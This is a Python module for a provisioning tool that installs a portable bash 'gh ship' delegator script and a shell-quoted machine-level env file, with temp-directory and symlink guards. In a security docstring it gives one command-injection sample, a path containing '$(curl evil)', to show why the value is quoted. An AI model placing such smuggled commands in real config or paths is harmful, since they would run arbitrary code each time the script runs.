"""Ship delegator script install: content, env file, transient-root guards and exclude entries."""

from __future__ import annotations

import os
import shlex
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path

from . import fsutil
from ..config import (
    SHIP_DELEGATOR_EXCLUDE_BEGIN_MARKER,
    SHIP_DELEGATOR_EXCLUDE_COMMENT,
    SHIP_DELEGATOR_EXCLUDE_END_MARKER,
    SHIP_DELEGATOR_REL_PATH,
)
from ..plan import Action
from . import git_exclude
from .result import ActionResult
from .shared import _chmod_x_if_changed


def ship_delegator_content() -> str:
    """The exact bytes of the provisioned ``.claude/scripts/pr-ship.sh`` — a pure constant.

    A thin delegator: the global ``gh ship`` alias runs ``<repo>/.claude/scripts/pr-ship.sh``; this
    script execs the canonical generalized ship implementation. Resolution order:

    1. REPO-LOCAL ``ci/ship/ship.sh`` (agent-tools — which carries the real ship.sh — self-hosts
       and always runs its own checked-out version).
    2. ``$AGENT_TOOLS_ROOT`` from the environment (an explicit env always wins).
    3. ``$AGENT_TOOLS_ROOT`` sourced from the machine-level env file
       ``${XDG_CONFIG_HOME:-$HOME/.config}/agent-tools/env`` (written by ``rig apply`` — see
       :func:`ship_env_file_content`), consulted only when the env var is unset.

    The rendered script is deliberately PORTABLE and BYTE-STABLE: it takes no parameters and bakes
    no machine-specific path, so a repo may commit the file verbatim (agent-tools#151 does) and a
    later ``rig apply`` byte-compares equal — no rewrite, no ``.rig-bak``, no dirty tree
    (rig-cli#108 was exactly that recurring drift).

    ``AGENT_TOOLS_ROOT`` is exported (once resolved) so nested invocations and spawned sub-shells
    inherit the same checkout.
    """
    return (
        "#!/usr/bin/env bash\n"
        "# Provisioned by rig (ship_delegator). The global `gh ship` alias runs\n"
        "# <repo>/.claude/scripts/pr-ship.sh. agent-tools' canonical, generalized ship\n"
        "# implementation lives at ci/ship/ship.sh — delegate to it so `gh ship` works in this\n"
        "# repo with the same green-CI-gated merge + cleanup as everywhere else. Repo-local\n"
        "# ci/ship/ship.sh wins (agent-tools self-hosts); otherwise $AGENT_TOOLS_ROOT — from the\n"
        "# environment, or from the machine-level env file rig apply writes. This script is\n"
        "# PORTABLE (no machine-specific paths), so a repo may commit it verbatim.\n"
        "set -euo pipefail\n"
        # `git rev-parse` EXITS NON-ZERO outside a git repo; under `set -e` a failing command
        # substitution in this assignment would abort the whole script (exit 128) before we ever
        # reach the canonical fallback. Guard it: run git separately with `|| true` so a non-git cwd
        # (or no git at all) just leaves toplevel empty and falls through to the AGENT_TOOLS_ROOT path.
        'toplevel="$(git rev-parse --show-toplevel 2>/dev/null || true)"\n'
        'repo_local="${toplevel:+$toplevel/ci/ship/ship.sh}"\n'
        'if [[ -n "$repo_local" && -f "$repo_local" ]]; then\n'
        '  exec "$repo_local" "$@"\n'
        "fi\n"
        # The machine-level env file supplies AGENT_TOOLS_ROOT when the env var is unset. An
        # explicit env always wins (source is skipped), so pointing a shell at another checkout
        # needs no re-apply. The file is rig-written (shell-quoted assignment) and user-owned
        # config — same trust level as the script itself. ${HOME:-} keeps `set -u` from aborting
        # in a sanitized env (no HOME) where AGENT_TOOLS_ROOT is passed explicitly.
        # `! -L` mirrors apply/drift, which REFUSE a symlink at this path: without it the
        # delegator would happily source (execute) a symlink target rig itself refuses to
        # manage — the enforcement and the runtime must draw the same line.
        'env_file="${XDG_CONFIG_HOME:-${HOME:-}/.config}/agent-tools/env"\n'
        'if [[ -z "${AGENT_TOOLS_ROOT:-}" && ! -L "$env_file" && -f "$env_file" ]]; then\n'
        "  # shellcheck source=/dev/null\n"
        '  source "$env_file"\n'
        "fi\n"
        # ${var:+...} keeps `set -u` safe when AGENT_TOOLS_ROOT is still unset (no env, no file):
        # canonical stays empty and we fall through to the diagnostic instead of aborting.
        'canonical="${AGENT_TOOLS_ROOT:+$AGENT_TOOLS_ROOT/ci/ship/ship.sh}"\n'
        'if [[ -n "$canonical" && -f "$canonical" ]]; then\n'
        "  export AGENT_TOOLS_ROOT\n"
        '  exec "$canonical" "$@"\n'
        "fi\n"
        'echo "pr-ship.sh: canonical ship.sh not found (repo-local $repo_local; AGENT_TOOLS_ROOT=${AGENT_TOOLS_ROOT:-<unset>}; env file $env_file)." >&2\n'
        "echo \"Set AGENT_TOOLS_ROOT (or write $env_file), or re-run 'rig apply'.\" >&2\n"
        "exit 127\n"
    )


def _system_temp_roots() -> list[Path]:
    """Resolved directories that hold throwaway, reboot-transient content.

    A machine-level pointer written UNDER one of these would name a checkout that vanishes on
    cleanup/reboot (a ``mkdtemp`` dir, ``$TMPDIR``, ``/tmp``). Paths are ``resolve()``-d so the
    macOS ``/tmp`` -> ``/private/tmp`` and ``/var`` -> ``/private/var`` symlinks can't defeat a
    containment check (``/tmp/x`` and ``/private/tmp/x`` are the same location).
    """
    # `tempfile.gettempdir()` can itself RAISE (FileNotFoundError: "No usable temporary directory")
    # in a locked-down/read-only environment. Probe it defensively so a status/apply path that calls
    # _is_under_system_temp() never crashes before the hard-coded roots below can answer.
    try:
        gettemp = tempfile.gettempdir()
    except Exception:
        gettemp = ""
    candidates = (
        gettemp,
        os.environ.get("TMPDIR", ""),
        "/tmp",
        "/private/tmp",
        "/var/folders",
        "/private/var/folders",
    )
    roots: list[Path] = []
    for c in candidates:
        if not c:
            continue
        try:
            roots.append(Path(c).resolve())
        except OSError:
            continue
    return roots


def _is_under_system_temp(p: Path) -> bool:
    """Whether ``p`` resolves inside one of :func:`_system_temp_roots` (or IS one)."""
    try:
        rp = p.resolve()
    except OSError:
        return False
    return any(rp == r or rp.is_relative_to(r) for r in _system_temp_roots())


def env_file_pins_transient_root(content: str | None) -> bool:
    """Whether an existing machine env file's ``AGENT_TOOLS_ROOT`` points UNDER a temp dir.

    Guards against HIDING an already-poisoned pointer behind the transient-source skip: a pointer
    that is ITSELF transient (a vanished ``mkdtemp`` checkout — the exact bug state this whole
    feature exists to prevent) must keep surfacing as drift even when the CURRENT run's source is
    also transient. Apply can't repair it from a throwaway source, so — mirroring the ``skipped_user``
    pattern — apply skips-with-note while status keeps flagging until a durable apply runs. Parses
    the same ``AGENT_TOOLS_ROOT=<shlex-quoted>`` line :func:`ship_env_file_content` writes; a
    missing/absent/unparsable value is treated as NOT-transient (nothing to keep surfacing here).
    """
    if not content:
        return False
    for raw_line in content.splitlines():
        line = raw_line.strip()
        # The delegator ``source``s this file, so ``export AGENT_TOOLS_ROOT=...`` is an equally
        # shell-honored assignment. Strip an optional leading ``export`` keyword before matching
        # so an EXPORTED poisoned pointer is not hidden behind the transient skip — otherwise
        # ``gh ship`` would source a dead temp path (exit 127) while status reports clean.
        if line.startswith("export") and line[6:7].isspace():
            line = line[6:].lstrip()
        if line.startswith("AGENT_TOOLS_ROOT="):
            try:
                parts = shlex.split(line.split("=", 1)[1])
            except ValueError:
                return False
            return bool(parts) and _is_under_system_temp(Path(parts[0]))
    return False


def ship_env_file_path() -> Path:
    """The machine-level env file the delegator sources: ``$XDG_CONFIG_HOME/agent-tools/env``.

    Resolved at CALL time (not import time) so tests can monkeypatch ``XDG_CONFIG_HOME``/``HOME``
    — and it MIRRORS the bash-side reader (``${XDG_CONFIG_HOME:-${HOME:-}/.config}/agent-tools/env``
    in :func:`ship_delegator_content`) expansion-for-expansion, so writer and reader can never
    point at different files. That rules out ``os.path.expanduser`` (its passwd-database fallback
    when ``HOME`` is unset has no bash equivalent — the two sides would silently diverge in a
    sanitized env and the delegator would exit 127 reading a file apply never wrote). With both
    ``XDG_CONFIG_HOME`` and ``HOME`` unset this yields ``/.config/agent-tools/env`` — exactly what
    the bash reader expands to — and the write fails LOUDLY (permission denied) instead of the two
    sides quietly disagreeing.
    """
    base = os.environ.get("XDG_CONFIG_HOME") or f"{os.environ.get('HOME', '')}/.config"
    return Path(base) / "agent-tools" / "env"


# The first line of a rig-written env file — the ownership marker `_reconcile_ship_env_file`
# keys on to tell a rig-owned file (rewritten in place) from user content (backed up first).
_SHIP_ENV_HEADER = "# Managed by rig (ship_delegator)"


def ship_env_file_content(canonical_ship: Path) -> str:
    """The exact bytes of the machine-level ``agent-tools/env`` file for a canonical ship.sh.

    One shell-quoted assignment: ``AGENT_TOOLS_ROOT='<agent-tools root>'``. This file — NOT the
    per-repo delegator — is where the machine-specific path lives, so the delegator itself stays
    portable and byte-stable.

    INVARIANT: one agent-tools checkout per machine. ``agent_tools_source`` is effectively a
    machine-level setting (the global config layer), and this file holds the ONE machine-wide
    pointer. If two repos on one machine declare DIVERGENT roots, each apply rewrites the file to
    its own root (last apply wins) and status in the other repo reports env-file drift — an honest
    signal of a genuinely ambiguous setup, not silent corruption. A per-shell
    ``AGENT_TOOLS_ROOT`` env var (which always wins over this file) or a repo-local
    ``ci/ship/ship.sh`` covers the exotic multi-checkout case.

    SECURITY: ``canonical_ship`` derives from the user-controlled ``agent_tools_source`` config,
    and the delegator ``source``\\ s this file, so the root is shell-quoted with
    :func:`shlex.quote`. Without that, a path containing ``"``, ``$()``, backticks, or a space
    would either break the sourced assignment or EXECUTE arbitrary commands every time ``gh ship``
    runs (e.g. ``agent_tools_source: /tmp/$(curl evil)/agent-tools``). Single-quoting renders
    every metacharacter inert.
    """
    # Derive the agent-tools root from the canonical ship.sh path (always ci/ship/ship.sh below root).
    agent_tools_root = canonical_ship.parent.parent.parent
    quoted_root = shlex.quote(str(agent_tools_root))
    return (
        f"{_SHIP_ENV_HEADER}: machine-level pointer to the agent-tools checkout.\n"
        "# Sourced by each repo's .claude/scripts/pr-ship.sh when $AGENT_TOOLS_ROOT is unset.\n"
        "# Rewritten by `rig apply` from agent_tools_source — edit that config, not this file.\n"
        f"AGENT_TOOLS_ROOT={quoted_root}\n"
    )


def transient_ship_root_skip_reason(canonical_ship: Path) -> str | None:
    """Reason to SKIP writing the machine-level env file for a transient source, else ``None``.

    The machine-level pointer (``$XDG_CONFIG_HOME/agent-tools/env``) names the ONE durable
    agent-tools checkout on this machine. A one-off ``rig apply`` whose ``agent_tools_source``
    resolves UNDER a temp dir (a ``mkdtemp`` clone, ``$TMPDIR``, ``/tmp`` — e.g. an agent testing
    agent-tools from a throwaway worktree, the vector that produced ``AGENT_TOOLS_ROOT=/private/
    var/folders/.../T/tmpXXXX/agent-tools``) must NOT clobber a PERSISTENT pointer with a path
    that vanishes the moment the tempdir is cleaned up. Once it vanishes, every portable delegator
    on the machine (``gh ship`` sources this file when ``$AGENT_TOOLS_ROOT`` is unset) exits 127
    until someone re-points it — the recurring "gh ship broken for everyone" bug this guards.

    Shared by apply (skip the WRITE, keep any existing good pointer) and drift (skip the CHECK, so
    status can't flag a change apply intentionally won't make) — mirrors :func:`repo_self_hosts_ship`,
    so status/apply never disagree.

    Fires ONLY when the resolved root is transient AND the pointer file itself is PERSISTENT — the
    exact doomed-pointer case. When BOTH are transient (pytest, or a cleanroom isolated under
    ``$TMPDIR``) the setup is self-consistent and the write proceeds; a durable-to-durable apply is
    the normal path and also proceeds.
    """
    root = canonical_ship.parent.parent.parent
    if _is_under_system_temp(root) and not _is_under_system_temp(ship_env_file_path()):
        return (
            f"refused to pin the machine-level agent-tools pointer at a transient checkout ({root}) "
            f"— left {ship_env_file_path()} unchanged; it would vanish on tempdir cleanup and break "
            "`gh ship` machine-wide. Set agent_tools_source to a durable checkout "
            "(e.g. ~/xp/agent-tools) and re-run `rig apply commit`."
        )
    return None


def _reconcile_ship_env_file(canonical_ship: Path, on_conflict: str) -> tuple[bool, str, str]:
    """Idempotently write the machine-level env file. Returns ``(ok, note, status)``.

    ``status`` is one of ``"unchanged"`` (already correct — a true no-op), ``"written"`` (the file
    was created/updated), or ``"skipped_user"`` (a user-owned file left as-is under
    ``on_conflict=skip`` — NOT clean: the caller must surface the note, since ``rig status`` will
    keep reporting env-file drift until the user reconciles it).

    Byte-compares before writing so a matching file is a true no-op (``changed=False``) — a
    re-apply must not churn mtimes or invent backups on the machine layer. A differing file that
    carries the rig ownership header (:data:`_SHIP_ENV_HEADER`) is rig-OWNED — rewritten in place,
    no backup, REGARDLESS of ``on_conflict`` (like the managed exclude block): the authoritative
    value is ``agent_tools_source`` in config, and drift here is a stale root or a hand-edit that
    belongs in config instead. Anything ELSE at this path is USER content rig did not write — it
    honors ``on_conflict`` via :func:`fsutil.write_file` (``backup`` keeps a ``*.rig-bak-*`` copy,
    ``skip`` leaves it untouched, ``overwrite`` replaces with no backup), never a silent clobber.
    ``ok=False`` (an unreadable/unwritable path) is surfaced by the caller as an apply ERROR — a
    delegator without a resolvable root exits 127 on machines with no env var.
    """
    path = ship_env_file_path()
    desired = ship_env_file_content(canonical_ship)
    # Anything that is not a plain regular file at the path — a directory, ANY symlink (dangling
    # or resolving), a fifo — is refused, never silently replaced (drift reports the same, so
    # status/apply agree). `lexists` (not `exists`) so a DANGLING symlink doesn't masquerade as
    # an absent file and get clobbered outside the conflict policy. Symlinks to regular files
    # are rejected too: the rig-owned rewrite goes through os.replace, which would swap the
    # SYMLINK for a real file — silently breaking a centrally-managed (e.g. dotfiles-repo)
    # symlink instead of updating its target. This structural refusal runs BEFORE the transient-
    # source skip below so a genuinely broken machine env file (dir/symlink/unreadable) still
    # surfaces even when THIS apply's source is throwaway — drift mirrors the same ordering.
    if path.is_symlink() or (os.path.lexists(path) and not path.is_file()):
        return False, f"a non-file sits at the env file path {path} (dir/symlink — refusing to replace it)", "unchanged"
    try:
        # UnicodeDecodeError is a ValueError, not an OSError — one non-UTF-8 byte (a hand-typed
        # latin-1 path, corruption) must surface as the same readable error, not a traceback.
        existing = path.read_text(encoding="utf-8") if path.is_file() else None
    except (OSError, UnicodeDecodeError) as exc:
        return False, f"could not read env file {path}: {exc}", "unchanged"
    # Never pin a PERSISTENT machine pointer at a TRANSIENT (temp-dir) agent-tools checkout: that
    # path dies on tempdir cleanup and breaks `gh ship` machine-wide (see the predicate). Skip the
    # CONTENT write (leaving any existing pointer intact) instead of erroring, so applying from a
    # throwaway source still succeeds — it just never poisons the durable pointer. Placed AFTER the
    # structural/read checks (so a broken env file still errors) but BEFORE the content write; drift
    # mirrors this exact ordering so status/apply stay in lockstep. The `skipped_transient` status
    # is surfaced by the caller (NOT dropped like a plain "unchanged"), so a transient apply that
    # left no resolvable pointer is visible, not a silent success.
    skip_reason = transient_ship_root_skip_reason(canonical_ship)
    if skip_reason is not None:
        return True, skip_reason, "skipped_transient"
    if existing == desired:
        return True, f"env file {path} up to date", "unchanged"
    try:
        if existing is not None and not existing.startswith(_SHIP_ENV_HEADER):
            out = fsutil.write_file(path, desired, on_conflict)
            if out.status == "skipped":
                return True, f"left user env file {path} as-is ({out.detail})", "skipped_user"
            return True, f"wrote env file {path} ({out.detail})", "written"
        path.parent.mkdir(parents=True, exist_ok=True)
        git_exclude._atomic_write_exclude(path, desired)
    except OSError as exc:
        return False, f"could not write env file {path}: {exc}", "unchanged"
    return True, f"wrote env file {path}", "written"


def repo_self_hosts_ship(repo_root: Path) -> bool:
    """Whether ``repo_root``'s delegator will hit the repo-local ``ci/ship/ship.sh`` at runtime.

    Shared by apply (skip the env-file reconcile) and drift (skip the env-file check) so the two
    can never disagree — and it mirrors the DELEGATOR's own runtime branch EXACTLY: the runtime
    resolves repo-local as ``$(git rev-parse --show-toplevel)/ci/ship/ship.sh``, so this predicate
    runs the SAME probe (not a filesystem approximation like ``.git`` exists — a corrupt/fake
    ``.git`` passes that but fails the real probe, and apply would then skip an env file the
    runtime needs, exit 127). A plain non-git dir carrying a ``ci/ship/ship.sh`` is therefore NOT
    self-hosting; the runtime, not the filesystem, is the contract.
    """
    try:
        res = subprocess.run(
            ["git", "-C", str(repo_root), "rev-parse", "--show-toplevel"],
            capture_output=True, text=True, timeout=10,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    if res.returncode != 0:
        return False
    toplevel = res.stdout.strip()
    if not toplevel:
        return False
    return (Path(toplevel) / "ci" / "ship" / "ship.sh").is_file()


def _is_rig_owned_delegator(path: Path) -> bool:
    """Whether an on-disk delegator carries the rig provenance header (ANY generation of it).

    Keys on the ``# Provisioned by rig (ship_delegator)`` line every rig-rendered delegator has
    opened with since the feature shipped — including the pre-0.9 baked-path format — so an
    upgrade rewrite can tell rig's own stale output (replace in place, no backup) from a user's
    hand-rolled file (conflict policy + backup). Unreadable/absent → ``False`` (treated as user
    content, the conservative branch: worst case is a spurious backup, never a lost user file).
    """
    try:
        head = path.read_text(encoding="utf-8", errors="replace")[:200] if path.is_file() else ""
    except OSError:
        return False
    return "# Provisioned by rig (ship_delegator)" in head


def ship_delegator_exclude_block_text() -> str:
    """The exact marker-delimited block rig owns in a repo's ``.git/info/exclude``.

    Single source of truth shared by the install handler and drift, so both agree byte-for-byte on
    what the managed entry SHOULD be: the begin marker, a fixed explanatory comment, the one ignored
    path (the provisioned delegator), then the end marker. Rendered byte-for-byte so a re-apply is a
    true zero-churn no-op.
    """
    return "\n".join(
        [
            SHIP_DELEGATOR_EXCLUDE_BEGIN_MARKER,
            SHIP_DELEGATOR_EXCLUDE_COMMENT,
            f"/{SHIP_DELEGATOR_REL_PATH}",
            # a conflict backup of the delegator (a hand-edited copy displaced under
            # on_conflict=backup) is an untracked SIBLING — un-ignored it dirties the worktree
            # and breaks the very `gh ship` this feature enables (ship refuses a dirty tree).
            f"/{SHIP_DELEGATOR_REL_PATH}.rig-bak-*",
            SHIP_DELEGATOR_EXCLUDE_END_MARKER,
        ]
    )


@dataclass(frozen=True)
class ShipDelegatorResolution:
    """The desired ship-delegator outcome for a repo — the one source apply + drift share.

    ``state`` is the single discriminator both consumers switch on:
      - ``ok``       — the delegator file is present and exactly correct AND the ``.git/info/exclude``
                       entry is present: no-op.
      - ``create``   — the delegator file is absent: write it (and add the exclude entry).
      - ``update``   — the delegator file exists but its bytes differ, OR the file is correct but the
                       exclude entry is missing: rewrite the file and/or add the entry.
      - ``io_error`` — the delegator path could not be inspected (a directory sits there, unreadable):
                       apply reports an ERROR, never a silent skip. ``detail`` carries why.

    ``content`` is the canonical delegator bytes; ``exclude_path`` is the resolved per-repo exclude
    file (``None`` when the repo is not a git repo — then there is nothing to ignore and the file
    write alone reconciles); ``exclude_ok`` records whether the exclude entry is already present;
    ``file_correct`` records whether the delegator FILE already matches ``content`` (so apply can
    skip a needless rewrite-with-backup when only the exclude is missing, and drift can tell the
    file-edited case from the missing-ignore case without re-reading the file).
    """

    delegator_path: Path
    content: str
    state: str
    exclude_path: Path | None
    exclude_ok: bool
    file_correct: bool = False
    detail: str = ""


def _exclude_has_entry(exclude_path: Path | None) -> bool:
    """True when the repo's ``.git/info/exclude`` carries EXACTLY ONE correct rig ship-delegator block.

    A repo with no git (no exclude path) → True (nothing to ignore, so "not missing"). An absent or
    unreadable exclude file → False. Otherwise this returns True ONLY when the file holds exactly one
    well-formed managed block whose body equals :func:`ship_delegator_exclude_block_text` — so all of
    these report as NOT-ok (drift, which ``_reconcile_ship_exclude`` then repairs): no block, an
    UNBALANCED pair (a begin with no end — reconcile refuses it, so it must not read "ok"), and
    DUPLICATED blocks (a prior non-idempotent edit — reconcile collapses them). Mirrors the global-
    excludes "ok" semantics so the two managed-block reconcilers agree on what "in sync" means.
    """
    if exclude_path is None:
        return True
    if not exclude_path.is_file():
        return False
    try:
        # newline="" — read RAW (no CRLF→LF translation), so this byte-compare matches
        # _reconcile_ship_exclude's raw read EXACTLY. Reading with translation here (read_text's
        # default) would normalize a CRLF file's \r away and report "ok" while the reconcile, seeing
        # the raw \r, rewrites the block — the two would disagree on "in sync" on a CRLF exclude file.
        with exclude_path.open(encoding="utf-8", newline="") as fh:
            content = fh.read()
    except OSError:
        return False
    begins = git_exclude._find_marker_lines(content, SHIP_DELEGATOR_EXCLUDE_BEGIN_MARKER)
    ends = git_exclude._find_marker_lines(content, SHIP_DELEGATOR_EXCLUDE_END_MARKER)
    if len(begins) != 1 or len(ends) != 1:
        return False  # absent, unbalanced, or duplicated → not in sync (reconcile fixes it)
    # exactly one balanced pair: it is "ok" only when its body matches the canonical block byte-for-
    # byte. CONTRACT: `_find_marker_lines` returns (line_start_offset, end_of_line_offset) where the
    # end offset is the newline terminating the marker line (or len(content)) — so content[b_start:
    # e_end] is exactly the block text WITHOUT a trailing newline, matching ship_delegator_exclude_
    # block_text(). `_reconcile_ship_exclude` slices identically, so the two stay in lockstep; if that
    # offset semantics ever changes, BOTH must update together (a SYNC pair).
    b_start, _b_end = begins[0]
    e_start, e_end = ends[0]
    if e_start < b_start:  # end before begin → misordered, reconcile by hand
        return False
    return content[b_start:e_end] == ship_delegator_exclude_block_text()


def resolve_ship_delegator(repo_root: Path) -> ShipDelegatorResolution:
    """Classify the on-disk ship-delegator state vs desired (pure, no writes).

    Reads the delegator file + the repo's ``.git/info/exclude`` and returns the one ``state`` apply
    and drift both switch on, so ``status`` never misreports the on-disk state. Idempotent: a correct
    file + a present exclude entry is ``ok``; an absent file is ``create``; a drifted file OR a
    correct file with a missing exclude entry is ``update``; a directory/unreadable path is
    ``io_error``. Takes no canonical path — the desired content is a portable constant.
    """
    content = ship_delegator_content()
    deleg = repo_root / SHIP_DELEGATOR_REL_PATH
    exclude_path = git_exclude.repo_info_exclude_path(repo_root)
    exclude_ok = _exclude_has_entry(exclude_path)

    if not deleg.exists():
        return ShipDelegatorResolution(deleg, content, "create", exclude_path, exclude_ok)
    if not deleg.is_file():
        return ShipDelegatorResolution(
            deleg, content, "io_error", exclude_path, exclude_ok,
            detail=f"{deleg} is not a regular file",
        )
    try:
        on_disk = deleg.read_text(encoding="utf-8")
    except OSError as exc:
        return ShipDelegatorResolution(
            deleg, content, "io_error", exclude_path, exclude_ok, detail=f"cannot read {deleg}: {exc}"
        )
    file_correct = on_disk == content
    if file_correct and exclude_ok:
        return ShipDelegatorResolution(deleg, content, "ok", exclude_path, exclude_ok, file_correct=True)
    return ShipDelegatorResolution(deleg, content, "update", exclude_path, exclude_ok, file_correct=file_correct)


def _reconcile_ship_exclude(exclude_path: Path | None) -> tuple[bool, str]:
    """Reconcile rig's managed ship-delegator block in ``.git/info/exclude``. Returns ``(ok, note)``.

    Reuses the same marker-block reconcile as the global excludes (``resolve_global_excludes``) so
    the per-repo entry collapses duplicates and preserves every other line verbatim. A repo with no
    git (no exclude path) is a no-op (nothing to ignore → ``ok``).

    ``ok`` is FALSE — and the caller surfaces it as an ERROR, not a misleading "created" — for any
    state where the ignore could NOT be established: an unreadable/unwritable exclude file (OSError),
    or an unbalanced/misordered marker pair rig refuses to rewrite. This matters because the whole
    point of the ignore is to keep the worktree clean (ship refuses a dirty tree); a delegator
    written-but-not-ignored is the exact failure mode this feature prevents, so it must never be
    reported as success.
    """
    if exclude_path is None:
        return True, "no git repo — delegator not ignored (nothing to reconcile)"
    # resolve_global_excludes fences entries with the GLOBAL markers; the ship delegator wants its
    # OWN marker text, so we render the desired block ourselves and splice it via the shared helper.
    ok, outcome = git_exclude.reconcile_exclude_block(
        exclude_path,
        ship_delegator_exclude_block_text(),
        SHIP_DELEGATOR_EXCLUDE_BEGIN_MARKER,
        SHIP_DELEGATOR_EXCLUDE_END_MARKER,
        "ship-delegator",
    )
    if not ok:
        return False, outcome
    if outcome == "already":
        return True, f"already ignored in {exclude_path}"
    return True, f"ignored in {exclude_path}"


def _ship_delegator_already_correct(
    action: Action, r: ShipDelegatorResolution, env_note: str, env_status: str
) -> ActionResult:
    """Result for a delegator that is already correct and ignored; the env-file outcome decides status."""
    base = f"ship-delegator: {r.delegator_path.name} already correct + ignored"
    if env_status == "written":
        return ActionResult(action, "updated", f"{base}; {env_note}")
    if env_status in ("skipped_user", "skipped_transient"):
        # NOT silently clean: either a stale user env file left per on_conflict=skip, or a
        # refusal to pin the machine pointer at a transient checkout. Surface the note so the
        # operator sees WHY the machine env file was left as-is (and, for the transient case,
        # that `gh ship` has no resolvable root here until agent_tools_source is durable).
        return ActionResult(action, "skipped", f"{base}; {env_note}")
    return ActionResult(action, "skipped", base)


def _write_ship_delegator_file(
    r: ShipDelegatorResolution, on_conflict: str
) -> tuple[fsutil.WriteOutcome | None, str, str | None, bool]:
    """Write the delegator when its bytes are wrong. Returns ``(outcome, note, backup, skipped_user_file)``."""
    if r.file_correct:
        return None, f"{r.delegator_path.name} already correct", None, False
    # An on-disk delegator carrying the rig provenance header is RIG content (e.g. the
    # pre-0.9 baked-path generation): replace it with NO .rig-bak sibling, regardless of
    # on_conflict — an upgrade that changes the rendered bytes would otherwise drop an
    # untracked backup next to the delegator in EVERY managed repo at once (dirty tree →
    # ship refuses → `gh ship` broken by its own provisioning). Only a file rig did not
    # write (no header — user content) gets the conflict policy and a backup.
    effective_conflict = "overwrite" if _is_rig_owned_delegator(r.delegator_path) else on_conflict
    out = fsutil.write_file(r.delegator_path, r.content, effective_conflict)
    _chmod_x_if_changed(r.delegator_path, out)
    # on_conflict=skip on a DIFFERENT existing file: write_file skips without writing. We still
    # reconcile the exclude so a left-as-is delegator is at least ignored.
    skipped_user_file = out.status == "skipped" and "on_conflict=skip" in out.detail
    return out, out.detail, out.backup, skipped_user_file


def _do_provision_ship_delegator(action: Action, on_conflict: str) -> ActionResult:
    """Provision/reconcile the per-repo ``.claude/scripts/pr-ship.sh`` delegator + its git-exclude.

    Two coupled steps, both idempotent:
      1. Write ``<repo>/.claude/scripts/pr-ship.sh`` ONLY when its bytes differ from the desired
         delegator (so a correct file is a true no-op and we never create a spurious ``.rig-bak``
         backup just because the EXCLUDE entry was missing). Honors ``on_conflict`` via
         :func:`fsutil.write_file` (a hand-edited delegator is backed up before overwrite) and sets
         the exec bit.
      2. ALWAYS reconcile rig's managed block in the repo's ``.git/info/exclude`` so the provisioned
         file does not dirty the worktree (ship refuses a dirty tree). The exclude is rig-OWNED (its
         own marker block), not user content, so it is reconciled regardless of ``on_conflict`` — a
         ``skip`` that leaves a hand-edited delegator file still gets the file ignored, so status
         won't re-flag a non-ignored delegator with no path forward. A repo with no git skips step 2
         (nothing to ignore).

    apply and drift switch on the SAME :func:`resolve_ship_delegator` ``state`` so status never
    misreports. ``io_error`` (a directory/unreadable at the delegator path) is an error, never a
    silent skip.
    """
    # Guard a missing/empty canonical_ship: a plan-builder regression that dropped the option would
    # otherwise render `canonical=` and write a silently-broken delegator (every `gh ship` → exit
    # 127 with no rig-side signal). Fail loudly instead. (The plan builder also fail-closes on a
    # checkout without ci/ship/ship.sh, so this is defense-in-depth.)
    raw_canonical = str(action.options.get("canonical_ship", "")).strip()
    if not raw_canonical:
        return ActionResult(action, "error", "ship-delegator: no canonical_ship in action options")
    canonical = Path(raw_canonical)

    # Step 0 — reconcile the MACHINE-level env file (the one place the agent-tools root lives; the
    # per-repo delegator is a portable constant that sources it). Runs before the state switch so a
    # repo whose delegator is already "ok" still gets a missing/stale env file repaired — a correct
    # delegator with no resolvable root would exit 127. Idempotent: a matching file is not rewritten.
    #
    # A SELF-HOSTING repo (carries its own ci/ship/ship.sh — agent-tools) is skipped entirely: its
    # delegator never reads the env file (the repo-local branch wins first), so touching a machine
    # file that repo doesn't need would (a) fail apply on an unwritable $XDG_CONFIG_HOME exactly
    # where the file is useless, and (b) rewrite/back-up a file `rig status` — which skips the env
    # check for self-hosting repos in `_check_ship_env_file`'s caller — never flagged (status/apply
    # parity cuts BOTH ways). Any ordinary repo on the machine reconciles the file when applied.
    # `repo_self_hosts_ship` requires GIT too: the runtime repo-local branch needs a git toplevel.
    if repo_self_hosts_ship(action.target):
        env_ok, env_note, env_status = True, "env file not needed (repo-local ci/ship/ship.sh)", "unchanged"
    else:
        env_ok, env_note, env_status = _reconcile_ship_env_file(canonical, on_conflict)
    if not env_ok:
        return ActionResult(
            action, "error",
            f"ship-delegator: {env_note} — delegator cannot resolve the agent-tools checkout "
            "without it (gh ship would exit 127 unless AGENT_TOOLS_ROOT is set)",
        )

    r = resolve_ship_delegator(action.target)

    if r.state == "io_error":
        return ActionResult(action, "error", f"ship-delegator: {r.detail}")
    if r.state == "ok":
        return _ship_delegator_already_correct(action, r, env_note, env_status)

    # Step 1 — write the file only when its bytes are wrong/absent (no needless backup when only the
    # exclude was missing).
    out, file_note, backup, skipped_user_file = _write_ship_delegator_file(r, on_conflict)

    # Step 2 — always reconcile the git-exclude (rig-owned block). A FAILURE here (unreadable/
    # unwritable exclude, or a marker pair rig won't rewrite) means the just-written delegator is NOT
    # ignored → the worktree is now dirty, the exact thing this feature prevents. Surface it as an
    # error, not a misleading "created" (the delegator is on disk, but the job is not done).
    exclude_ok, exclude_note = _reconcile_ship_exclude(r.exclude_path)
    if not exclude_ok:
        return ActionResult(
            action, "error",
            f"ship-delegator: {file_note}; {exclude_note} — delegator written but NOT git-ignored "
            "(worktree will be dirty; ship refuses a dirty tree)",
            backup,
        )

    env_suffix = f"; {env_note}" if env_status != "unchanged" else ""
    # A machine env file left AS-IS (a stale user file under on_conflict=skip, or a transient-source
    # refusal to pin the pointer) must not vanish into a "created"/"updated" success — status may
    # still report env-file drift (a poisoned pointer) or the delegator may have no resolvable root,
    # so the action reports "skipped" (with the file_note naming what WAS written) exactly like the
    # delegator-ok branch above. Mirrors the skipped_user handling for skipped_transient.
    if skipped_user_file or env_status in ("skipped_user", "skipped_transient"):
        return ActionResult(action, "skipped", f"ship-delegator: {file_note}; {exclude_note}{env_suffix}", backup)
    # status: a changed file OR a freshly-added exclude entry is a change. file_correct→exclude-only
    # change reports "updated" (the exclude was added); a written file reports its own write status.
    status = out.status if out is not None else "updated"
    return ActionResult(action, status, f"ship-delegator: {file_note}; {exclude_note}{env_suffix}", backup)
